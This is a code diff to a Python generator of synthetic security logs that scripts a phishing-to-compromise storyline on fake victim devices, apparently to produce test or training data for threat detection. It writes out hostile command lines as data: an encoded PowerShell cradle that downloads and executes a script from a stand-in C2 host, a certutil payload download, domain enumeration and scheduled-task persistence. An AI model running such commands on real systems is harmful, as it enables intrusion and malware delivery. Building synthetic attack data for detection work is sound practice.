@@ -7,6 +7,7 @@ model fall back to the per-column rules in generator.py.
 """
 from __future__ import annotations
 
+import base64
 import hashlib
 import random
 from dataclasses import dataclass, field
@@ -115,7 +116,10 @@ class World:
         self.c2 = [f"cdn-{fake.hex(4)}.test", f"login-{fake.hex(3)}.test"]
         self.attacker_ips = [f"198.51.100.{rng.randint(1, 254)}" for _ in range(3)]
         self.dc_ip = fake.mark("ip_private", f"10.0.0.{rng.randint(2, 20)}")
-        self.story: dict[str, tuple[list, int, User]] = {}  # victim device -> (steps, next step, user)
+        # victim device -> (steps, user, start); each step has a fixed time
+        # offset, so the same event lines up across tables.
+        self.story: dict[str, tuple[list, User, datetime]] = {}
+        self.story_pos: dict[tuple[str, str], int] = {}  # (table, victim) -> next step
 
     def _user(self) -> User:
         first, last = self.f.person()
@@ -244,11 +248,18 @@ class Context:
 NETWORK_ACTIONS = ["ConnectionSuccess", "ConnectionSuccess", "ConnectionSuccess", "ConnectionFailed",
                    "InboundConnectionAccepted", "ConnectionRequest"]
 LURES = ["Lönespec november", "Faktura {n}", "Uppdaterade bankuppgifter", "Utbetalning {iban}",
-         "Delad fil: Lönespec_{first}_{last}.pdf"]
+         "Delad fil: Lönespec_{first}_{last}.docm"]
+
+
+def _enc(script: str) -> str:
+    """PowerShell -EncodedCommand: Base64 of UTF-16LE."""
+    return base64.b64encode(script.encode("utf-16-le")).decode()
 
 
 def _attack_steps(w: World, d: Device, u: User):
-    """The storyline on a victim device: (parent, child, command, network)."""
+    """The storyline on a victim device: (parent, child, command, network, offset).
+
+    offset: seconds after the storyline start (when the lure is opened)."""
     f = w.f
     c2 = w.rng.choice(w.c2)
     lure = f"Lönespec_{u.first}_{u.last}_{w.rng.randint(2024, 2026)}.docm"
@@ -257,8 +268,11 @@ def _attack_steps(w: World, d: Device, u: User):
     target = w.rng.choice([x for x in w.devices if x is not d] or [d])
     steps = [
         ("outlook.exe", "winword.exe", f'"WINWORD.EXE" /n "C:\\Users\\{u.sam}\\Downloads\\{lure}"', None),
-        ("winword.exe", "powershell.exe", f"powershell.exe -nop -w hidden -enc {f.hex(48)}", (c2, 443)),
+        ("winword.exe", "powershell.exe",
+         "powershell.exe -nop -w hidden -enc "
+         + _enc(f"IEX (New-Object Net.WebClient).DownloadString('https://{c2}/s/{f.hex(6)}')"), (c2, 443)),
         ("powershell.exe", "certutil.exe", f"certutil.exe -urlcache -f http://{c2}/dl/{f.hex(12)}.php {temp}\\a.exe", (c2, 80)),
+        ("powershell.exe", "a.exe", f'"{temp}\\a.exe"', (c2, 443)),
         ("powershell.exe", "net.exe", f"net user {u.sam} /domain", (w.ad_domain, 389)),
         ("powershell.exe", "schtasks.exe",
          f'schtasks /create /tn "Update" /tr "C:\\Users\\{u.sam}\\Documents\\upd.ps1" /sc hourly /ru {u.netbios}\\{u.sam}', None),
@@ -269,7 +283,11 @@ def _attack_steps(w: World, d: Device, u: User):
     ]
     if w.injections:
         steps.append(("cmd.exe", "powershell.exe", f'powershell.exe -c "Write-Host \'{w.rng.choice(INJECTIONS)}\'"', None))
-    return steps
+    t, out = 0, []
+    for s in steps:
+        out.append((*s, t))
+        t += w.rng.randint(20, 400)
+    return out
 
 
 from .values import INJECTIONS  # noqa: E402
@@ -294,13 +312,26 @@ def make_context(w: World, table: str, actions: list[str], ts: datetime, report_
     malicious = rng.random() < 0.25
     d = rng.choice(w.victims if malicious else w.devices)
     u = rng.choice(d.users)
+    step = None
     if malicious:
-        # The storyline advances in order per victim, so time order matches it.
+        # Each table walks the victim's storyline once, in order; every step
+        # has a fixed time, so tables agree. The lure mail comes first.
         if d.name not in w.story:
-            w.story[d.name] = (_attack_steps(w, d, u), 0, u)
-        steps, i, u = w.story[d.name]
-        w.story[d.name] = (steps, i + 1, u)
-        parent_name, child_name, cmd, net = steps[i % len(steps)]
+            w.story[d.name] = (_attack_steps(w, d, u), u, ts)
+        steps, u, start = w.story[d.name]
+        i = w.story_pos.get((table, d.name), 0)
+        limit = 1 if table.startswith("Email") else len(steps)
+        if i < limit:
+            w.story_pos[(table, d.name)] = i + 1
+            step = steps[i]
+            ts = start - timedelta(seconds=rng.randint(180, 1200)) if table.startswith("Email") \
+                else start + timedelta(seconds=step[4], microseconds=rng.randint(0, 999999))
+        else:
+            malicious = False
+            d = rng.choice(w.devices)
+            u = rng.choice(d.users)
+    if step:
+        parent_name, child_name, cmd, net, _ = step
     else:
         chains = [c for c in BENIGN_CHAINS if c[1] in BENIGN_NET] if net_table else BENIGN_CHAINS
         parent_name, child_name, cmd = rng.choice(chains)
@@ -316,7 +347,8 @@ def make_context(w: World, table: str, actions: list[str], ts: datetime, report_
     parent = w.proc(d, parent_name, f'"{parent_name}"', ts - timedelta(minutes=rng.randint(1, 90)),
                     None if parent_name in SYSTEM_PROCS else u, p_folder)
     child = w.proc(d, child_name, cmd, ts - timedelta(seconds=rng.randint(0, 30)),
-                   None if child_name in SYSTEM_PROCS and parent_name in SYSTEM_PROCS else u)
+                   None if child_name in SYSTEM_PROCS and parent_name in SYSTEM_PROCS else u,
+                   f"C:\\Users\\{u.sam}\\AppData\\Local\\Temp" if child_name == "a.exe" else None)
     remote_ip, remote_port, remote_url = "", 0, ""
     if net:
         host, port = net
@@ -352,7 +384,7 @@ def email_value(w: World, ctx: Context, col: str):
     if not hasattr(ctx, "_mail"):
         if ctx.malicious:
             sender = f.mark("email", f"{w.rng.choice(['payroll', 'ekonomi', 'it-support'])}@{w.rng.choice(w.c2)}")
-            subject = w.rng.choice(LURES).format(n=w.rng.randint(1000, 9999), iban=f.iban(), first=u.first, last=u.last)
+            subject = w.rng.choice(LURES[:1] + LURES[4:]).format(n=w.rng.randint(1000, 9999), iban=f.iban(), first=u.first, last=u.last)
             if "{first}" in subject or "Lönespec_" in subject:
                 f.mark("file_pii", subject.split(": ", 1)[-1])
             if w.injections and w.rng.random() < 0.1:
@@ -372,7 +404,7 @@ def email_value(w: World, ctx: Context, col: str):
         "Subject": m["subject"], "NetworkMessageId": m["id"],
         "EmailDirection": "Inbound" if ctx.malicious else "Intra-org",
         "DeliveryAction": "Delivered", "DeliveryLocation": "Inbox/folder",
-        "SenderIPv4": w.rng.choice(w.attacker_ips) if ctx.malicious else ctx.device.ip,
+        "SenderIPv4": w.rng.choice(w.attacker_ips) if ctx.malicious else "",  # intra-org: no external hop
         "SenderIPv6": "",
         "InternetMessageId": f"<{m['id'][:18]}@{sender_domain}>",
         "ThreatTypes": "Phish" if ctx.malicious else "",
